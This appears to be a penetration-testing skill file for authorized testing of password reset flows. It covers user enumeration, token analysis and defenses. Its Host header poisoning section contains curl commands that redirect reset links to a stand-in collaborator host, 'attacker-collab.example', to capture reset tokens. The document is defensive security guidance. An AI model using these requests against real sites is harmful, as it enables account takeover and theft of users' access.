---
name: password-reset-abuse
description: Use when testing password reset and account recovery flows on
  an authorized engagement. Covers token prediction and leakage, Host header
  poisoning of reset links, user enumeration through reset responses, and
  unsafe token delivery. Use when reviewing forgot-password functionality,
  when reset emails or links are in scope, when testing account takeover
  without the password, or when assessing enumeration risks in auth flows.
version: 1.0.0
domain: auth
lifecycle: stable
last_verified: 2026-10-23
parent: auth-attacks
requires: [auth-attacks]
extends: []
relates: [osint-methodology, web-xss]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
  - name: Python
    version: 3.12
---

Password reset is account takeover without needing the password, so its
flaws are among the highest-impact auth findings. This skill covers testing
reset flows on authorized engagements: token strength and handling, Host
header poisoning, enumeration leaks, and delivery weaknesses. Use only test
accounts you control; reset flows touch real inboxes, so coordinate with
the test lead before triggering emails.

## Quick Workflow

1. Map the reset flow: request, delivery, token format, expiry, single
   use.
2. Test user enumeration: compare responses and timing for valid versus
   invalid accounts.
3. Test Host header poisoning: does the reset link use your Host.
4. Analyze token entropy, expiry, and single-use enforcement.
5. Test delivery: where the token goes, what logs it, what caches it.
6. Attempt takeover of your own test account end to end where allowed.
7. Document each weakness with exact requests.

## 1. Enumeration testing

```bash
# Compare reset responses for a real and a fake account
curl -s -X POST 'https://target.example/reset' \
  -d 'email=realuser_target@example.com' -o /tmp/r1.html -w '%{http_code} %{time_total}\n'
curl -s -X POST 'https://target.example/reset' \
  -d 'email=nobody-xyz123@example.com' -o /tmp/r2.html -w '%{http_code} %{time_total}\n'
diff /tmp/r1.html /tmp/r2.html | head -10

# Timing side channel: real accounts often take longer (email render)
for i in 1 2 3; do
  curl -s -o /dev/null -w 'real: %{time_total}\n' -X POST \
    'https://target.example/reset' -d 'email=realuser_target@example.com'
  curl -s -o /dev/null -w 'fake: %{time_total}\n' -X POST \
    'https://target.example/reset' -d 'email=nobody-xyz123@example.com'
done
```

Identical responses and identical timing for both cases is the correct
behavior. Any difference, in body, status, or timing, is an enumeration
finding.

## 2. Host header poisoning

```bash
# If the reset email builds its link from the Host header, point it at
# your collaborator and read the token from the incoming request
curl -s -X POST 'https://target.example/reset' \
  -H 'Host: attacker-collab.example' \
  -d 'email=victim_test@example.com' -o /dev/null -w '%{http_code}\n'
# Then check the collaborator for a hit containing the reset token

# Variations when Host is validated: try X-Forwarded-Host and
# X-Forwarded-For, which some frameworks prefer
curl -s -X POST 'https://target.example/reset' \
  -H 'Host: target.example' \
  -H 'X-Forwarded-Host: attacker-collab.example' \
  -d 'email=victim_test@example.com' -o /dev/null -w '%{http_code}\n'
```

A poisoned reset link sends the victim's token to the attacker: full
account takeover from one request. Verify by requesting a reset for your
own test account and confirming the emailed link points at your host.

## 3. Token analysis

```bash
# Request two resets and compare token structure
# (use the test mailbox the engagement provided)
# token1=eyJ... token2=eyJ... -> decode and compare claims

# Expiry test: request a token, wait past the stated lifetime,
# then try to use it
# Single-use test: use the token once, then try to use it again

# Predictability: short numeric tokens or tokens derived from
# timestamps are brute-forceable or guessable
python3 - <<'EOF'
# Example: check whether tokens look random across samples
tokens = ["a3f9c1", "b7e2d4"]  # paste real samples
print("lengths:", {len(t) for t in tokens})
print("charset:", sorted(set("".join(tokens))))
EOF
```

Tokens must be long, random, single-use, and short-lived (15 to 60
minutes). Anything weaker, especially tokens in URLs that get logged and
cached, is a finding.

## Edge cases

- Reset links go through an email security scanner that clicks them.
  Scanner clicks can consume single-use tokens; coordinate timing with
  the test lead or use a scanner-safe mailbox.
- The flow uses security questions. Test them for guessability and
  researchability; public-record answers are not authentication.
- Tokens arrive by SMS. Note SIM-swap exposure and check whether the
  app offers a stronger channel.
- The reset changes the email without re-authentication. An attacker
  with session access can lock the real user out; test the flow as the
  authenticated test user too.

## Escalation

- Host poisoning works: demonstrate with your own test account only,
  capture the collaborator hit with the token, and report it as
  critical; do not harvest real users' tokens.
- Enumeration is confirmed at scale risk: show the valid versus invalid
  difference clearly and explain the account-harvesting scenario.
- You need the full takeover demo: get written approval first, use the
  test account, and revert the password afterward.

## Detection and defender view

Defenders see reset abuse as reset requests for many accounts from one
source (enumeration), requests with odd Host headers, and token-use
anomalies (reuse attempts, expired tokens). Defenses are uniform
responses with constant-time handling, Host header allow-listing,
strong random single-use tokens with short expiry, rate limiting the
reset endpoint, and notifying the account owner of every reset request.

## Key references

- MITRE ATT&CK T1556 (Modify Authentication Process).
- CWE-640 (Weak Password Recovery Mechanism for Forgotten Password).
- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- OWASP Testing Guide: Testing for Account Enumeration.
- PortSwigger Web Security Academy: Password reset poisoning.
